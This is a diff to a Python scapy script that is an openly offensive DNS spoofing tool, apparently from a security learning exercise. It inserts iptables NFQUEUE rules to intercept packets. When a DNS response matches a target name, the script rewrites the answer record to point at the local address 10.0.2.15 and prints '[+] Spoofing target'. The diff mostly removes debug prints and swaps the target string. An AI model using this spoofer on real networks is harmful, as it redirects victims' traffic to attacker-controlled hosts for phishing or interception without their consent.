@@ -6,7 +6,7 @@ import scapy.all as scapy
 
 
 def create_queue(id):
-    # for testing in local machine call 2 times, and change de field FORWARD to: OUTPUT, INPUT
+    # for testing in remote machine use the line below
     # subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", id])
     subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", id])
     subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", id])
@@ -14,18 +14,12 @@ def create_queue(id):
 
 
 def process_packet(packet):
-    #print("ENTRA EN PROCESS PACKET")
     scapy_packet = scapy.IP(packet.get_payload())
-    #print("pilla el payload")
-    #if scapy_packet.haslayer(scapy.DNS):
-    #    print(scapy_packet[scapy.DNSQR].qname)
+    
     if scapy_packet.haslayer(scapy.DNSRR):
-        print("IF 1")
-       # print(scapy_packet.show())
         qname = scapy_packet[scapy.DNSQR].qname
-        print(qname)
-        if "rowenta" in qname:
-            #print("IF 2")
+
+        if "namepage" in qname:
             print("[+] Spoofing target")
             response = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
             scapy_packet[scapy.DNS].an = response
